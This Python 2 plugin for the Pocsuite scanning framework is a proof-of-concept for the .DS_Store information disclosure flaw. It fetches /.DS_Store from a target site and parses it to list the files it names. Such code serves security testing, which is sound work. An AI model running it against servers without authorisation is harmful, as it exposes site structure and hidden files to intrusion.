#!/usr/bin/env python
# coding: utf-8
import re

from pocsuite.api.request import req
from pocsuite.api.poc import POCBase, Output
from pocsuite.api.poc import register

from ds_store import DSStore

class TestPOC(POCBase):
    vulID = '1729'  # vul ID
    version = '1'
    author = ['ricter']
    vulDate = '2015-03-09'
    createDate = '2015-03-09'
    updateDate = '2015-03-09'
    references = ['http://www.securityfocus.com/bid/3324/discuss']
    name = 'Apple Macintosh OS X .DS_Store Information Disclosure'
    appPowerLink = 'http://www.apple.com'
    appName = 'Apple Macintosh OS X'
    appVersion = 'all version'
    vulType = 'Information Disclosure'
    desc = '''
        在开发过程中开发者可能会把 .DS_Store 文件上传到网站上导致
        信息泄露漏洞。
    '''

    samples = ['']
    install_requires = ['ds_store==1.0.1']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        url = '%s/.DS_Store' % self.url
        response = req.get(url).content
        filelist = []
        if '\x00\x00\x00\x01\x42\x75\x64\x31' in response:
            try:
                with DSStore.open(response, 'r+') as obj:
                        for i in obj:
                            filelist.append(i.filename)
            except Exception, e:
                print '[-] Error: %s' % str(e)
            result['FileInfo'] = {}
            result['FileInfo']['Filename'] = url
            result['FileInfo']['Content']  = set(list(filelist))

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)